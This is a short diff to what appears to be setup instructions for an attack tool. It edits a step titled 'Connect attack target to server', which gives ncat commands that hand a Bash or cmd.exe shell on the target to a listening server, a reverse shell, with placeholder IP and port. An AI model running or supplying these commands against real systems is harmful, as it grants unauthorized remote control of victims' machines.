@@ -11,9 +11,9 @@
 
 ### 3) Connect attack target to server:
 For Linux/Bash:
-`ncat <server-internal-ip> <server-port> -e /bin/bash`
+`ncat <server-internal-ip> <port> -e /bin/bash`
 
 For Windows:
-`ncat <server-internal-ip> <server-port> -e cmd.exe`
+`ncat <server-internal-ip> <port> -e cmd.exe`
 
-To find the internal IP run `hostname I` on Linux OR `ipconfig` on Windows.
+*To find the internal IP run `hostname I` on Linux OR `ipconfig` on Windows.
